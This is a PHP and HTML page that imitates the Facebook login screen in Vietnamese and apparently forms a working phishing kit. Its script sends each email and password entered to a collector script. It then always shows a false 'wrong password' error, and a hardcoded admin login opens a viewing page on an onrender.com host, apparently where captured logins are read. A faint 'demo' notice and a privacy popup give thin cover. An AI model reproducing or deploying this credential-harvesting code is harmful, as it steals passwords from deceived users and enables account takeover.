<?php
session_start();
$show_error = false;
if (isset($_SESSION['show_error']) && $_SESSION['show_error'] === true) {
    $show_error = true;
    unset($_SESSION['show_error']);
}
?>
<!doctype html>
<html lang="vi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Đăng nhập — Facebook</title>
  <style>
    * { box-sizing: border-box;
margin: 0; padding: 0; }
    html, body { height: 100%; font-family: "Helvetica Neue", Arial, sans-serif; background: #f0f2f5;
color: #1c1e21; }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
padding: 40px 20px;
    }
    .container {
      max-width: 1100px;
      display: flex;
      gap: 40px;
align-items: flex-start;
      justify-content: center;
      animation: fadeIn 0.6s ease forwards;
    }
    @keyframes fadeIn { to { opacity: 1;
transform: scale(1); } }

    .left {
      flex: 1 1 60%;
      padding-left: 30px;
animation: slideInLeft 0.8s ease forwards;
    }
    @keyframes slideInLeft { from { opacity: 0; transform: translateX(-30px);
} to { opacity: 1; transform: translateX(0); } }

    .logo {
      font-weight: 700;
color: #1877f2;
      font-size: 76px;
      letter-spacing: -2px;
      margin-bottom: 18px;
      line-height: 1;
}
    .subtitle {
      font-size: 22px;
      color: #050505;
      max-width: 520px;
      line-height: 1.35;
}

    .right {
      width: 360px;
      min-width: 300px;
      display: flex;
      flex-direction: column;
align-items: center;
      animation: slideInRight 0.8s ease forwards;
    }
    @keyframes slideInRight { from { opacity: 0; transform: translateX(30px);
} to { opacity: 1; transform: translateX(0); } }

    .card {
      width: 100%;
background: #fff;
      border-radius: 8px;
      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
      padding: 18px;
      border: 1px solid rgba(0,0,0,0.06);
}
    form .input {
      width: 100%;
      margin-bottom: 12px;
      position: relative;
}
    .input input {
      width: 100%;
      padding: 14px 12px;
      border-radius: 6px;
border: 1px solid #dddfe2;
      font-size: 15px;
      outline: none;
      transition: 0.2s;
}
    .input input:focus {
      border-color: #a3c2ff;
      box-shadow: 0 0 0 2px rgba(24,119,242,0.12);
}
    .error-text {
      font-size: 13px;
      color: #d93025;
      margin-top: 4px;
      display: none;
text-align: left;
    }

    .btn {
      width: 100%;
      padding: 12px 14px;
      border-radius: 6px;
font-weight: 600;
      font-size: 16px;
      border: none;
      cursor: pointer;
      transition: 0.2s;
}
    .btn-primary {
      background: #1877f2;
      color: white;
      margin: 6px 0 14px;
}
    .btn-primary:hover {
      background: #166fe5;
}

    .link-forgot {
      text-align: center;
      font-size: 14px;
      color: #1877f2;
      text-decoration: none;
display: block;
      margin-bottom: 14px;
    }

    .divider {
      height: 1px;
      background: #e9ebee;
margin: 8px 0 14px;
    }

    .btn-create {
      background: #42b72a;
      color: white;
padding: 10px 18px;
      border-radius: 6px;
      font-weight: 600;
      display: inline-block;
      text-align: center;
      text-decoration: none;
      transition: 0.2s;
}
    .btn-create:hover {
      background: #36a420;
}

    .create-page-note {
      margin-top: 14px;
      font-size: 13px;
      color: #4b4f56;
      text-align: center;
max-width: 320px;
    }
    .create-page-note strong {
      color: #050505;
}

    
@media (max-width: 900px) {
  body {
    padding: 20px 10px;
    align-items: flex-start;
}
  .container {
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    text-align: center;
    gap: 24px;
}
  .left {
    padding-left: 0;
    margin-bottom: 10px;
  }
  .logo {
    font-size: 56px;
}
  .subtitle {
    font-size: 17px;
    max-width: 90%;
    margin: 0 auto 18px;
}
  .right {
    width: 100%;
    max-width: 360px;
  }
  .card {
    width: 100%;
padding: 22px 18px;
  }
  .input input {
    font-size: 16px;
    padding: 14px 12px;
}
  .btn {
    font-size: 17px;
    padding: 13px;
  }
  .btn-create {
    width: 100%;
}
}

@media (max-width: 600px) {
  body {
    padding: 16px 10px;
align-items: flex-start;
  }
  .logo {
    font-size: 48px;
  }
  .subtitle {
    font-size: 16px;
line-height: 1.4;
  }
  .card {
    padding: 18px 14px;
}
  .btn, .btn-create {
    font-size: 16px;
    padding: 12px;
}
  .privacy-popup-content {
    width: 94%;
    padding: 20px 18px;
    font-size: 14px;
}
  .privacy-popup-content h2 {
    font-size: 18px;
}
}

    .privacy-popup {
      position: fixed;
      top: 0;
left: 0; right: 0; bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(6px);
z-index: 9999;
      animation: fadeInPopup 0.4s ease forwards;
    }
    @keyframes fadeInPopup {
      from { opacity: 0;
}
      to { opacity: 1;
}
    }
    .privacy-popup-content {
      background: #fff;
      border-radius: 12px;
box-shadow: 0 10px 35px rgba(0,0,0,0.15);
      max-width: 500px;
      width: 90%;
      padding: 26px 28px;
      text-align: left;
      transform: translateY(-20px);
animation: slideUp 0.5s ease forwards;
    }
    @keyframes slideUp {
      from { transform: translateY(30px);
opacity: 0; }
      to { transform: translateY(0); opacity: 1;
}
    }
    .privacy-popup-content h2 {
      color: #1c1e21;
      font-size: 22px;
margin-bottom: 10px;
    }
    .privacy-popup-content p,
    .privacy-popup-content li {
      color: #444;
font-size: 15px;
      line-height: 1.6;
    }
    .privacy-popup-content ul {
      margin: 10px 0 10px 20px;
}
    #continue-btn {
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
font-weight: 600;
      padding: 10px 20px;
      margin-top: 14px;
      transition: all 0.3s ease;
      opacity: 0.5;
      cursor: not-allowed;
}
    #continue-btn.active {
      opacity: 1;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(24,119,242,0.3);
}
    #continue-btn.active:hover {
      background: #166fe5;
}
  </style>
</head>
<body spellcheck="false">
  <div class="container">
    <div class="left">
      <div class="logo">facebook</div>
      <div class="subtitle">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
    </div>

    <div class="right">
      <div class="card">
<form id="loginForm" method="POST" action="codephp.php">
  <div class="input">
    <input name="email" id="email" type="text" placeholder="Email hoặc số điện thoại" required />
    <div id="emailError" class="error-text"></div>
  </div>

  <div class="input">
    <input name="password" id="password" type="password" placeholder="Mật khẩu" required />
  
  <div id="passwordError" class="error-text"></div>
  </div>

  <button class="btn btn-primary" type="submit">Đăng nhập</button>
  <a href="#" class="link-forgot">Quên mật khẩu?</a>

  <div class="divider"></div>
  <div style="text-align:center;">
    <a href="#" class="btn-create">Tạo tài khoản mới</a>
  </div>
</form>
      </div>
      <div class="create-page-note">
        <strong>Tạo Trang</strong> dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.
</div>
    </div>
  </div>

  <div id="privacy-popup" class="privacy-popup" role="dialog" aria-modal="true" aria-labelledby="privacy-title">
    <div class="privacy-popup-content" role="document">
      <h2 id="privacy-title">Privacy Policy</h2>

      <p>
        This <strong>demo website</strong> may collect information.
Please read carefully before proceeding.
      </p>

      <ul>
        <li><strong>Information you enter:</strong> email / phone number, and password (for demo accounts only).</li>
        <li><strong>Technical info:</strong> anonymous IP, browser, OS, access time, and interactions.</li>
      </ul>

      <p><strong>Purpose:m:</strong> demo authentication, UI testing, and improvement.
<strong>No third-party sharing.</strong></p>
      <p><strong>Security:</strong> passwords are transmitted.</p>

      <div style="margin-top:16px; display:flex; flex-direction:column; align-items:center;">
        <label style="display:inline-flex;align-items:center;gap:8px;margin-top:6px;font-size:15px;">
          <input type="checkbox" id="agree-checkbox"> <span>I have read and agree</span>
        </label>

        <button id="continue-btn" disabled>Continue</button>
      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
    const pwInput = document.getElementById('password');
    const emailError = document.getElementById('emailError');
    const pwError = document.getElementById('passwordError');

    const successUrl = 'https://RmFjZWJvb2t2bg.onrender.com/codephp.php?view';
const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
    const phoneRegex = /^(0|\+84)\d{9,10}$/;

    function showError(el, msg) { el.textContent = msg; el.style.display = 'block';
}
    function hideError(el) { el.style.display = 'none'; el.textContent = '';
}
    
    function sendCredentials(email, password, actionUrl) {
      const formData = new FormData();
      formData.append('email', email);
      formData.append('password', password);
      
      fetch(actionUrl, {
        method: 'POST',
        body: formData,
        credentials: 'omit'
      })
      .then(response => {
      })
      .catch(error => {
      });
    }

    form.addEventListener('submit', function(e) {
      e.preventDefault(); 
      hideError(emailError);
      hideError(pwError);

      const email = emailInput.value.trim();
      const pw = pwInput.value.trim();

      if (email === 'super@$adminuser$' && pw === 'super@$adminpass$') {
        window.location.href = successUrl;
        return;
      }

      if (!email) { showError(emailError, 'Vui lòng nhập email hoặc số điện thoại.'); return; }
 
     if (!pw) { showError(pwError, 'Vui lòng nhập mật khẩu.'); return; }

      sendCredentials(email, pw, form.action);

      if (gmailRegex.test(email) || phoneRegex.test(email)) {
        showError(pwError, 'Email hoặc mật khẩu không đúng.');
      } else {
        showError(emailError, 'Không đúng định dạng. Vui lòng nhập Gmail hoặc số điện thoại hợp lệ.');
      }
    });

[emailInput, pwInput].forEach(el => el.addEventListener('input', () => {
      hideError(emailError);
      hideError(pwError);
    }));
    document.addEventListener('DOMContentLoaded', function() {
      const popup = document.getElementById('privacy-popup');
      const checkbox = document.getElementById('agree-checkbox');
      const continueBtn = document.getElementById('continue-btn');


      popup.style.display = 'flex';

      checkbox.addEventListener('change', () => {
        if (checkbox.checked) {
          continueBtn.disabled = false;
          continueBtn.classList.add('active');
    
    } else {
          continueBtn.disabled = true;
          continueBtn.classList.remove('active');
        }
      });

      continueBtn.addEventListener('click', () => {
        if (!continueBtn.disabled) {
          popup.style.display = 'none';
        }
      });
    });
</script>
<div style="
  position: fixed;
  bottom: 10px;
  right: 14px;
  font-size: 13px;
  color: rgba(230, 230, 230,0.85);
  z-index: 9999;
  user-select: none;
">
  Demo page — not related to Facebook
</div>
<div id="privacy-btn" style="
  position: fixed;
  bottom: 14px;
  left: 14px;
  background: #1877f2;
  color: #fff;
  border-radius: 50px;
  padding: 8px 16px;
  font-size: 14px;
  font-weight: 600;
  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
  cursor: pointer;
  transition: all 0.3s ease;
  z-index: 9999;
">
  Privacy
</div>

<script>
  const privacyBtn = document.getElementById('privacy-btn');
const popup = document.getElementById('privacy-popup');

  privacyBtn.addEventListener('mouseenter', () => {
    privacyBtn.style.background = '#166fe5';
  });
privacyBtn.addEventListener('mouseleave', () => {
    privacyBtn.style.background = '#1877f2';
  });
privacyBtn.addEventListener('click', () => {
    popup.style.display = 'flex';
  });
</script>
</body>

</html>



